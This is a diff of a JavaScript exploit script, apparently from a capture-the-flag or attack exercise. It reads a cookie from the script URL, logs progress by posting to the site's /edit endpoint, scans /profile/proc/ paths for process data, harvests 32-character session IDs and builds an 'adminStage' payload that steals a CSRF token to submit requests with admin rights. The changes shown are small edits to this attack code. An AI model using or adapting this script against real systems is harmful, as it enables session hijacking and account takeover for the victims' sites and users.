@@ -2,7 +2,6 @@
   const userCookie = decodeURIComponent((document.currentScript.src.split("#")[1] || ""));
   const proc = "/profile/proc/";
   const enc = encodeURIComponent;
-  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
   const post = (text) => fetch("/edit", {
     method: "POST",
@@ -19,7 +18,7 @@
     }
   };
 
-  await post("driver start");
+  await post("p2 start");
 
   const drivers = [];
   for (let base = 1; base < 12000; base += 80) {
@@ -35,7 +34,6 @@
 
   drivers.sort((a, b) => b[0] - a[0]);
   const activeDrivers = drivers.slice(0, 2);
-
   await post("drivers " + drivers.length + " use " + activeDrivers.map((x) => x[0]).join("."));
 
   const sessions = [];
@@ -63,7 +61,8 @@
 
         for (const m of data.matchAll(/[a-f0-9]{32}/g)) {
           const sid = m[0];
-          if (new Set(sid).size > 8 && !sessions.some((x) => x[0] === port && x[1] === sid)) {
+          const unique = new Set(sid).size;
+          if (unique > 8 && !sessions.some((x) => x[0] === port && x[1] === sid)) {
             sessions.push([port, sid]);
           }
         }
@@ -89,6 +88,7 @@
 
   const adminStage = `
     (async () => {
+      await fetch("/_api/session/validate");
       const f = new FormData();
       f.append("__csrf__", document.querySelector("meta[name=csrf]").content);
       f.append("__json__", JSON.stringify({
